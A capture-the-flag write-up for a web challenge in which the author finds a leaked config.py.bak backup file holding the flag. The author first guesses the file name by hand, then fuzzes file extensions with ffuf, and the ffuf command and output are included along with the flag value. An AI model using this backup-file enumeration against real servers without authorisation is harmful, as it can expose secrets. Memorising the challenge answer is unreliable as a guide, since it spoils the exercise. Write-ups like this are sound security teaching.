## On the page "http://leak1.chal.deti:8010"
I saw
``` 

App
Static assets under /static/.
config
```

I then clicked on config and got redirected to "http://leak1.chal.deti:8010/static/config.py"
This page showed
```

API_URL = 'https://api.acme.internal' 
```

## Method
I tried first to access that URL and it didnt work.
Then I tried to ping it to check if its a real URL and found out that its not 

Then I tried to search for files under the static/ folder and after A LOT of tries and a tip for the site "The home page links to a config file. Editors leave twins, I eventually found a file that was name config.py.bak that had the flag in there

The page was "http://leak1.chal.deti:8010/static/config.py.bak"
On that page was
```

API_URL = 'https://api.acme.internal' FLAG = 'flag{f53622bef6a33b33099bb151f8f5e7ff}'
```

__Alternative__

The better method is:
- You know there is a config.py file right there
- You suspect it might an extension
- The dictionary with the externsions is /usr/share/dirb/wordlists/mutations_common.txt 
- So i run ffuf to check those
This is what happened
```

s04@s04:~$ ffuf -u http://leak1.chal.deti:8010/static/config.pyFUZZ -w /usr/share/dirb/wordlists/mutationscommon.txt 

        /'__\  /'\           /'\
       /\ _/ /\ _/      /\ _/
       \ \ ,\ \ ,/\ /\ \ \ \ ,\
        \ \ _/ \ \ _/\ \ _\ \ \ \ _/
         \ _\   \ _\  \ _/  \ _\
          //    //   //    //

       v2.1.0-dev
__

 :: Method           : GET
 :: URL              : http://leak1.chal.deti:8010/static/config.pyFUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/mutations_common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
__

.bak                    [Status: 200, Size: 86, Words: 5, Lines: 3, Duration: 25ms]
                        [Status: 200, Size: 38, Words: 3, Lines: 2, Duration: 19ms]
                        [Status: 200, Size: 38, Words: 3, Lines: 2, Duration: 20ms]
                        [Status: 200, Size: 38, Words: 3, Lines: 2, Duration: 19ms]
                        [Status: 200, Size: 38, Words: 3, Lines: 2, Duration: 19ms]
                        [Status: 200, Size: 38, Words: 3, Lines: 2, Duration: 19ms]
:: Progress: [49/49] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
s04@s04:~$

```
```

```
- Notice that .bak returns 200, so there something at config.py.bak

- Go to "http://leak1.chal.deti:8010/static/config.py.bak"
- Flag is there

## Reproduce
Go to "http://leak1.chal.deti:8010/static/config.py.bak"

__Alternative__

- Run ffuf -u http://leak1.chal.deti:8010/static/config.pyFUZZ -w /usr/share/dirb/wordlists/mutationscommon.txt 
- Check that .bak has returned 200
- Go to "http://leak1.chal.deti:8010/static/config.py.bak"
```
```
```
```
```
```
```
```
